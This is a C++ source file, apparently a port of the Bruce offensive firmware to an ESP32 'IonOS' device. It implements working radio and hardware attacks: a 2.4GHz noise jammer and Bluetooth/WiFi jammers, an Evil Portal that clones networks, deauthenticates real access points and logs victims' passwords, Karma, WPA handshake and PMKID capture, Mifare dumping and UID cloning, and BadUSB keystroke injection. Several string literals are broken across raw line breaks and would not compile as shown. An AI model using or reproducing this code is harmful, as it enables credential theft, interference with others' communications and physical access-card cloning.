// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::irMenu(){
    m_state=BruceState::IR; m_prevState=BruceState::MAIN;
    char pin[48]; snprintf(pin,48,"IR TX: GPIO%d  (connect IR LED+68Ω)",BRUCE_IR_TX_PIN);
    showList("Infrared",{
        {pin,         nullptr, false},
        {"TV-B-Gone", [this]{ irTvBGone(); }},
        {"Custom .ir files from SD", [this]{ irCustom(); }},
    },CIR);
}

// Compact set of NEC power codes for common TV brands (from Bruce's WORLD_IR_CODES.h)
struct NecCode { const char* brand; uint32_t code; };
static const NecCode NEC_CODES[]={
    {"Samsung",    0x20DF10EF}, {"Samsung2",   0xE0E040BF},
    {"LG",         0x20DF40BF}, {"LG2",        0x20DF19E6},
    {"Sony",       0x00000A90}, {"Sony2",      0x00000290},
    {"Panasonic",  0x40040100}, {"Philips",    0x00100C00},
    {"TCL/Roku",   0x57E3A05F}, {"Vizio",      0x20DF10EF},
    {"Hisense",    0x1CE3481B}, {"Sharp",      0x2A4C926D},
    {nullptr,0}
};

void BruceApp::taskIrTvBGone(void* a){
    auto* s=((BruceTaskArg*)a)->app; delete (BruceTaskArg*)a;

    // Configure RMT for IR at 38kHz
    rmt_tx_channel_config_t txCfg={
        .gpio_num=(gpio_num_t)BRUCE_IR_TX_PIN,
        .clk_src=RMT_CLK_SRC_DEFAULT,
        .resolution_hz=1000000,
        .mem_block_symbols=64,
        .trans_queue_depth=4,
    };
    rmt_channel_handle_t ch=nullptr;
    if(rmt_new_tx_channel(&txCfg,&ch)!=ESP_OK){
        ESP_LOGE(TAG,"IR init fail — check GPIO%d",BRUCE_IR_TX_PIN);
        vTaskDelete(nullptr); return;
    }
    rmt_carrier_config_t carrier={.frequency_hz=38000,.duty_cycle=0.33f};
    rmt_apply_carrier(ch,&carrier);
    rmt_enable(ch);

    // Build NEC frame symbols and transmit
    // NEC: 9ms lead high, 4.5ms low, then 32 bits (LSB first)
    // bit-1: 560µs high + 1690µs low  bit-0: 560µs high + 560µs low
    auto sendNec=[&](uint32_t code){
        const int U=560; // unit in µs
        std::vector<rmt_symbol_word_t> syms;
        // Leader
        syms.push_back({.duration0=16*U,.level0=1,.duration1=8*U,.level1=0});
        // 32 data bits
        for(int b=0;b<32;b++){
            bool bit=(code>>b)&1;
            syms.push_back({.duration0=U,.level0=1,
                             .duration1=(uint16_t)(bit?3*U:U),.level1=0});
        }
        // Stop bit
        syms.push_back({.duration0=U,.level0=1,.duration1=U,.level1=0});

        rmt_transmit_config_t tc={.loop_count=0};
        rmt_transmit(ch,nullptr,syms.data(),syms.size()*sizeof(rmt_symbol_word_t),&tc);
        rmt_tx_wait_all_done(ch,100);
    };

    int ci=0;
    while(!s->m_taskStop){
        if(!NEC_CODES[ci].brand) ci=0;
        ESP_LOGI(TAG,"TV-B-Gone: %s 0x%08lX",NEC_CODES[ci].brand,(unsigned long)NEC_CODES[ci].code);
        sendNec(NEC_CODES[ci].code);
        ci++;
        vTaskDelay(pdMS_TO_TICKS(250));
    }
    rmt_disable(ch); rmt_del_channel(ch);
    vTaskDelete(nullptr);
}
void BruceApp::irTvBGone(){
    m_prevState=BruceState::IR;
    showRunning("TV-B-Gone",
        "Sending power-off codes to all TV brands.\n"
        "Point at displays.  B = Stop");
    startTask("bruce_ir",taskIrTvBGone,new BruceTaskArg{this},8192);
}

void BruceApp::irCustom(){
    std::vector<FileEntry> files;
    SDDriver::getInstance().listDir("/sdcard/infrared",files);
    if(files.empty()){
        showResult("Custom IR","No .ir files.\nCopy Flipper .ir files to /sdcard/infrared/",false);
        return;
    }
    std::vector<BruceOpt> opts;
    for(auto& f:files){
        if(!f.isDir){
            std::string path="/sdcard/infrared/"+f.name;
            opts.push_back({f.name,[this,path]{
                showResult("IR Send",("Sending: "+path+"\n(.ir parser: IonOS v1.1)").c_str(),true);
            }});
        }
    }
    showList("IR Files on SD",opts,CIR);
}

// ═════════════════════════════════════════════════════════════════════════════
// NRF24  — uses IonOS NRF24Driver
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::nrf24Menu(){
    m_state=BruceState::NRF24; m_prevState=BruceState::MAIN;
    showList("NRF24L01+",{
        {"2.4GHz Jammer",   [this]{ nrf24Jammer(); }},
        {"Spectrum Scanner",[this]{ nrf24Spectrum();}},
    },CNRF);
}

void BruceApp::taskNrf24Jammer(void* a){
    auto* s=((BruceTaskArg*)a)->app; delete (BruceTaskArg*)a;
    auto& nrf=NRF24Driver::getInstance();
    uint8_t noise[32];
    for(int ch=0;!s->m_taskStop;ch=(ch+1)%126){
        nrf.setChannel(ch);
        for(int i=0;i<32;i++) noise[i]=esp_random()&0xFF;
        nrf.send(noise,32);
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    nrf.setChannel(76);
    vTaskDelete(nullptr);
}
void BruceApp::nrf24Jammer(){
    m_prevState=BruceState::NRF24;
    showRunning("NRF24 Jammer","Hopping channels + transmitting noise…  B=Stop");
    startTask("bruce_nrfjam",taskNrf24Jammer,new BruceTaskArg{this},4096);
}

struct NrfSpecArg { BruceApp* app; lv_obj_t* chart; lv_chart_series_t* ser; };

void BruceApp::taskNrf24Spectrum(void* a){
    auto* ar=(NrfSpecArg*)a; auto* s=ar->app; delete ar;
    auto& nrf=NRF24Driver::getInstance();
    while(!s->m_taskStop){
        for(int ch=0;ch<126&&!s->m_taskStop;ch++){
            nrf.setChannel(ch);
            vTaskDelay(pdMS_TO_TICKS(1));
            int cd=nrf.readCarrierDetect()?75:5;
            s->m_nrfRssi[ch]=(s->m_nrfRssi[ch]*3+cd)/4;
            if(s->m_specChart && UIEngine::getInstance().lock(20)){
                lv_chart_set_value_by_id(s->m_specChart,s->m_specSeries,ch,s->m_nrfRssi[ch]);
                UIEngine::getInstance().unlock();
            }
        }
    }
    nrf.setChannel(76);
    vTaskDelete(nullptr);
}

void BruceApp::nrf24Spectrum(){
    m_prevState=BruceState::NRF24;
    clearContent();
    m_state=BruceState::RUNNING; m_taskActive=true;

    m_content=lv_obj_create(m_screen);
    lv_obj_set_size(m_content,320,240); lv_obj_set_pos(m_content,0,0);
    lv_obj_set_style_bg_color(m_content,lc(CB),0); lv_obj_set_style_border_width(m_content,0,0);
    lv_obj_clear_flag(m_content,LV_OBJ_FLAG_SCROLLABLE|LV_OBJ_FLAG_CLICKABLE);
    makeTitleBar(m_content,"2.4GHz Spectrum",CNRF);

    m_specChart=lv_chart_create(m_content);
    lv_obj_set_size(m_specChart,308,170); lv_obj_set_pos(m_specChart,6,50);
    lv_obj_set_style_bg_color(m_specChart,lc(0x0d1117),0);
    lv_obj_set_style_border_width(m_specChart,0,0);
    lv_chart_set_type(m_specChart,LV_CHART_TYPE_BAR);
    lv_chart_set_point_count(m_specChart,126);
    lv_chart_set_range(m_specChart,LV_CHART_AXIS_PRIMARY_Y,0,100);
    m_specSeries=lv_chart_add_series(m_specChart,lc(CNRF),LV_CHART_AXIS_PRIMARY_Y);
    lv_chart_set_all_value(m_specChart,m_specSeries,0);

    lv_obj_t* ht=lv_label_create(m_content);
    lv_label_set_text(ht,"Channels 0-125  B=Stop");
    lv_obj_set_style_text_color(ht,lc(CD),0);
    lv_obj_set_style_text_font(ht,&lv_font_montserrat_12,0);
    lv_obj_align(ht,LV_ALIGN_BOTTOM_MID,0,-2);

    // Chart refresh timer
    m_uiTimer=lv_timer_create([](lv_timer_t* t){
        auto* s=(BruceApp*)t->user_data;
        if(s->m_specChart) lv_chart_refresh(s->m_specChart);
    },100,this);

    startTask("bruce_nrfspec",taskNrf24Spectrum,
              new NrfSpecArg{this,m_specChart,m_specSeries},4096);
}

// ═════════════════════════════════════════════════════════════════════════════
// FILES
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::filesMenu(){
    m_state=BruceState::FILES; m_prevState=BruceState::MAIN;
    std::vector<FileEntry> ents;
    SDDriver::getInstance().listDir("/sdcard",ents);
    std::vector<BruceOpt> opts;
    char free[32]; snprintf(free,32,"Free: %llu MB",SDDriver::getInstance().freeSpace()/1024/1024);
    opts.push_back({free,nullptr,false});
    for(auto& e:ents){
        char lbl[64];
        if(e.isDir) snprintf(lbl,64,"[DIR] %s",e.name.c_str());
        else        snprintf(lbl,64,"%s  (%zu KB)",e.name.c_str(),e.size/1024);
        opts.push_back({lbl,nullptr,!e.isDir});
    }
    if(ents.empty()) opts.push_back({"SD card not mounted",nullptr,false});
    showList("SD Card Files",opts,CFILE);
}

// ═════════════════════════════════════════════════════════════════════════════
// OTHERS
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::othersMenu(){
    m_state=BruceState::OTHERS; m_prevState=BruceState::MAIN;
    showList("Others",{
        {"QR Code Generator",  [this]{ qrMenu(); }},
        {"System Info",        [this]{
            char b[120];
            snprintf(b,120,"Free heap: %zu KB\nFree PSRAM: %zu KB\nIDF: %s\nBruce: v1.14",
                heap_caps_get_free_size(MALLOC_CAP_INTERNAL)/1024,
                heap_caps_get_free_size(MALLOC_CAP_SPIRAM)/1024,
                IDF_VER);
            showResult("System Info",b,true);
        }},
        {"Reboot",             [this]{ esp_restart(); }},
    },COTH);
}

void BruceApp::qrMenu(){
    showList("QR Code Generator",{
        {"Bruce Firmware repo",  [this]{ showQR("https://github.com/pr3y/Bruce","Bruce v1.14"); }},
        {"IonOS repo",           [this]{ showQR("https://github.com/ionos","IonOS"); }},
        {"WiFi credentials QR",  [this]{ showQR("WIFI:S:MyNet;T:WPA;P:password;;","WiFi QR"); }},
    },COTH);
}

// ═════════════════════════════════════════════════════════════════════════════
// CONFIG
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::configMenu(){
    m_state=BruceState::CONFIG; m_prevState=BruceState::MAIN;
    char irP[32]; snprintf(irP,32,"IR TX Pin: GPIO%d",BRUCE_IR_TX_PIN);
    showList("Bruce Config",{
        {irP,                         nullptr, false},
        {"NRF24 channel: 76",         nullptr, false},
        {"WiFi — use IonOS Settings",  nullptr, false},
        {"Bruce firmware website",     [this]{ showQR("https://github.com/pr3y/Bruce","Bruce"); }},
    },CCFG);
}

// ═════════════════════════════════════════════════════════════════════════
// EVIL PORTAL — injected at end of bruce_app.cpp
// ═════════════════════════════════════════════════════════════════════════
static EvilPortal    g_portal;
static WifiAttacks   g_wifiAtks;
static PN532         g_pn532;
static BadUSB        g_badusb;
static BlueJammer    g_jammer;

// These are called from the existing wifiAttacksMenu / bleMenu etc.
// We extend those menus here rather than touching the existing code.

void bruceEvilPortalUI(BruceApp* self)
{
    // Show portal config sub-menu
    EvilPortal::Config cfg;
    cfg.apSsid   = "Free WiFi";
    cfg.htmlFile = "";  // use default

    // Show scan to pick target
    std::vector<BruceAP> aps;
    g_wifiAtks.scan(aps);

    // Build list of available SSIDs to clone
    std::vector<BruceOpt> opts;
    opts.push_back({"Default SSID: 'Free WiFi'", [self, cfg]() mutable {
        g_portal.start(cfg, [self](const std::string& ssid,
                                    const std::string& pwd,
                                    const std::string& mac){
            if (UIEngine::getInstance().lock(200)) {
                NotificationPopup::getInstance().show("Evil Portal",
                    ("GOT CREDS: "+pwd).c_str(), ION_NOTIF_SUCCESS, 5000);
                UIEngine::getInstance().unlock();
            }
        });
        self->showResult("Evil Portal Running",
            ("AP: Free WiFi
DNS hijacked → 192.168.4.1
"
             "Creds saved to /sdcard/bruce_portal_creds.txt
"
             "Press B to stop").c_str(), true);
    }, true});

    for (auto& ap : aps) {
        std::string ssid = ap.ssid;
        opts.push_back({ssid + " (clone)", [self, ssid, ap]() mutable {
            EvilPortal::Config cfg2;
            cfg2.apSsid       = ssid;
            cfg2.channel      = ap.channel;
            cfg2.deauthTarget = true;
            memcpy(cfg2.targetBssid, ap.bssid, 6);
            g_portal.start(cfg2, [self, ssid](const std::string& s,
                                               const std::string& p,
                                               const std::string& m){
                if (UIEngine::getInstance().lock(200)) {
                    std::string msg = "CREDS: " + p;
                    NotificationPopup::getInstance().show("Evil Portal", msg.c_str(),
                        ION_NOTIF_SUCCESS, 6000);
                    UIEngine::getInstance().unlock();
                }
            });
            self->showResult("Evil Portal Running",
                ("Cloned: "+ssid+"
Deauthing real AP…
Creds→/sdcard/bruce_portal_creds.txt
"
                 "Press B to stop").c_str(), true);
        }, true});
    }
    self->showList("Evil Portal — Choose SSID", opts, CERR);
}

void bruceWifiAtksFull(BruceApp* self)
{
    std::vector<BruceAP> aps;
    g_wifiAtks.scan(aps);

    std::vector<BruceOpt> opts;
    opts.push_back({"Probe Sniffer", [self](){
        g_wifiAtks.startProbeSniffer([self](const std::string& e){
            if (UIEngine::getInstance().lock(100)){
                NotificationPopup::getInstance().show("Probe",e.c_str(),ION_NOTIF_INFO,2000);
                UIEngine::getInstance().unlock();
            }
        });
        self->showRunning("Probe Sniffer",
            "Channel-hopping, logging probe requests
to /sdcard/bruce_probes.txt
B=Stop");
    }});
    opts.push_back({"Raw Packet PCAP", [self](){
        g_wifiAtks.startRawSniffer([self](const std::string& e){});
        self->showRunning("Raw PCAP", "Saving all 802.11 frames to
/sdcard/bruce_raw_N.pcap
B=Stop");
    }});
    opts.push_back({"Karma Attack", [self](){
        g_wifiAtks.startKarmaAttack([self](const std::string& e){
            if (UIEngine::getInstance().lock(100)){
                NotificationPopup::getInstance().show("Karma",e.c_str(),ION_NOTIF_INFO,2000);
                UIEngine::getInstance().unlock();
            }
        });
        self->showRunning("Karma Attack",
            "Responding to all probe requests
with matching rogue APs
B=Stop");
    }});

    for (auto& ap : aps) {
        std::string label = ap.ssid + " ["+std::to_string(ap.rssi)+"dBm ch"+std::to_string(ap.channel)+"]";
        opts.push_back({label + " — Handshake", [self, ap](){
            g_wifiAtks.startHandshakeCapture(ap, true,
                [self](const std::string& e){
                    if(UIEngine::getInstance().lock(100)){
                        NotificationPopup::getInstance().show("Handshake",e.c_str(),ION_NOTIF_SUCCESS,3000);
                        UIEngine::getInstance().unlock();
                    }
                });
            std::string msg = "Target: "+ap.ssid+"
Sending deauth + capturing EAPOL
PCAP→/sdcard/bruce_hs/
B=Stop";
            self->showRunning("WPA Handshake", msg.c_str());
        }});
        opts.push_back({label + " — PMKID", [self, ap](){
            g_wifiAtks.startPmkidCapture(ap, [self](const std::string& e){
                if(UIEngine::getInstance().lock(100)){
                    NotificationPopup::getInstance().show("PMKID",e.c_str(),ION_NOTIF_SUCCESS,3000);
                    UIEngine::getInstance().unlock();
                }
            });
            std::string msg = "Target: "+ap.ssid+"
Capturing PMKID (hashcat -m 22000)
PCAP→/sdcard/bruce_pmkid_N.pcap
B=Stop";
            self->showRunning("PMKID Capture", msg.c_str());
        }});
    }
    self->showList("WiFi Attacks — Select Target", opts, CWIFI);
}

void bruceRfidUI(BruceApp* self)
{
    self->showList("RFID (PN532)", {
        {"Detect Card", [self](){
            if (!g_pn532.isPresent()) {
                if (!g_pn532.init()) {
                    self->showResult("PN532","PN532 not found!
Check I2C wiring SDA=GPIO8 SCL=GPIO9",false);
                    return;
                }
            }
            RfidTag tag;
            if (!g_pn532.detectCard(tag)) {
                self->showResult("RFID Scan","No card detected.
Hold card near antenna.",false);
                return;
            }
            std::string info = tag.type + "
UID: " + tag.uidHex() +
                               "
SAK: " + std::to_string(tag.sak);
            self->showResult("Card Found!", info.c_str(), true);
        }},
        {"Dump Mifare Classic", [self](){
            if (!g_pn532.isPresent()) g_pn532.init();
            RfidTag tag;
            if (!g_pn532.detectCard(tag)) { self->showResult("RFID","No card",false); return; }
            if (!tag.isMifareClassic())   { self->showResult("RFID","Not Mifare Classic",false); return; }
            self->showRunning("Dumping…","Reading all 64 blocks…");
            g_pn532.dumpMifareClassic(tag);
            g_pn532.saveDump(tag);
            std::string r = "Blocks read: "+std::to_string(tag.blockData.size())+
                            "
Saved to /sdcard/bruce_rfid/"+tag.uidHex()+".nfc";
            self->showResult("Dump Complete", r.c_str(), !tag.blockData.empty());
        }},
        {"Clone UID", [self](){
            if (!g_pn532.isPresent()) g_pn532.init();
            self->showRunning("Clone","Step 1: Hold SOURCE card…");
            RfidTag src;
            for (int i=0;i<30;i++) {
                if (g_pn532.detectCard(src)) break;
                vTaskDelay(pdMS_TO_TICKS(200));
            }
            if (src.uidLen == 0) { self->showResult("Clone","No source card found",false); return; }
            std::string srcUid = src.uidHex();
            NotificationPopup::getInstance().show("Clone", ("Source: "+srcUid).c_str(), ION_NOTIF_INFO, 3000);
            vTaskDelay(pdMS_TO_TICKS(3000));
            self->showRunning("Clone","Step 2: Hold MAGIC CARD (Chinese writable)…");
            vTaskDelay(pdMS_TO_TICKS(2000));
            bool ok = g_pn532.cloneUid(src);
            self->showResult("Clone", ok ? ("Cloned "+srcUid+" to magic card").c_str()
                                         : "Clone failed — check magic card",ok);
        }},
        {"NDEF Write", [self](){
            if (!g_pn532.isPresent()) g_pn532.init();
            bool ok = g_pn532.writeNdef("https://github.com/pr3y/Bruce");
            self->showResult("NDEF Write", ok ? "Written: Bruce GitHub URL" : "Write failed", ok);
        }},
        {"Firmware Version", [self](){
            if (!g_pn532.isPresent()) g_pn532.init();
            self->showResult("PN532 Info", g_pn532.firmwareVersion().c_str(),
                             g_pn532.isPresent());
        }},
    }, CFILE);
}

void bruceBadUsbUI(BruceApp* self)
{
    // List .txt/. duck/.ducky files from SD
    std::vector<FileEntry> files;
    SDDriver::getInstance().listDir("/sdcard/BadUSB", files);
    SDDriver::getInstance().listDir("/sdcard/badusb", files);

    std::vector<BruceOpt> opts;
    opts.push_back({"Init USB HID", [self](){
        bool ok = g_badusb.init();
        self->showResult("USB HID", ok ? "Keyboard ready — device enumerated by host"
                                       : "USB HID failed — check USB cable & host", ok);
    }});
    opts.push_back({"Quick Test (open Notepad)", [self](){
        if (!g_badusb.isReady()) g_badusb.init();
        // Windows: GUI+R, type notepad, Enter
        std::string script =
            "GUI r
"
            "DELAY 500
"
            "STRING notepad
"
            "ENTER
"
            "DELAY 800
"
            "STRING Hello from IonOS Bruce BadUSB!
"
            "ENTER
";
        volatile bool stop = false;
        g_badusb.runScript(script, [self](int n, const std::string& cmd){
            if (UIEngine::getInstance().lock(50)){
                // could update line counter display
                UIEngine::getInstance().unlock();
            }
        }, &stop);
        self->showResult("BadUSB","Script executed",true);
    }});

    for (auto& f : files) {
        if (f.isDir) continue;
        std::string name = f.name;
        std::string ext  = name.size()>4 ? name.substr(name.rfind('.')) : "";
        if (ext==".txt"||ext==".ducky"||ext==".duck"||ext==".ds") {
            std::string path = "/sdcard/BadUSB/" + name;
            opts.push_back({name, [self, path](){
                if (!g_badusb.isReady()) g_badusb.init();
                self->showRunning("Running Script", ("Executing: "+path+"
B=Abort").c_str());
                volatile bool stop_flag = false;
                g_badusb.runFile(path, nullptr, &stop_flag);
                self->showResult("Script Done", ("Executed: "+path).c_str(), true);
            }});
        }
    }
    if (files.empty()) {
        opts.push_back({"No scripts found — copy .txt Ducky scripts to /sdcard/BadUSB/",
                        nullptr, false});
    }
    self->showList("BadUSB / HID Injection", opts, COTH);
}

void bruceJammerUI(BruceApp* self)
{
    self->showList("Blue/WiFi Jammer", {
        {"Sweep Wide (BT+BLE ch37-79)", [self](){
            g_jammer.start(BlueJammer::Mode::SWEEP_WIDE);
            self->showRunning("BlueJammer SWEEP_WIDE",
                "Bouncing BT channels 37-79
±2 spacing, max power
Jams Bluetooth & BLE
B=Stop");
        }},
        {"Sweep Low (WiFi ch0-14)", [self](){
            g_jammer.start(BlueJammer::Mode::SWEEP_LOW);
            self->showRunning("BlueJammer SWEEP_LOW",
                "Flooding WiFi channels 0-14
Jams 2.4GHz WiFi, Zigbee, BLE adv
B=Stop");
        }},
        {"Full Spectrum (ch0-125)", [self](){
            g_jammer.start(BlueJammer::Mode::SWEEP_FULL);
            self->showRunning("BlueJammer FULL SWEEP",
                "Jamming all 126 channels
Affects WiFi + BT + Zigbee + everything 2.4GHz
B=Stop");
        }},
        {"Constant Carrier ch45", [self](){
            g_jammer.start(BlueJammer::Mode::CONSTANT, 45);
            self->showRunning("BlueJammer CONSTANT",
                "Constant carrier on channel 45
Maximum interference on one frequency
B=Stop");
        }},
        {"⚠ Use responsibly — illegal in many jurisdictions", nullptr, false},
    }, CNRF);
}
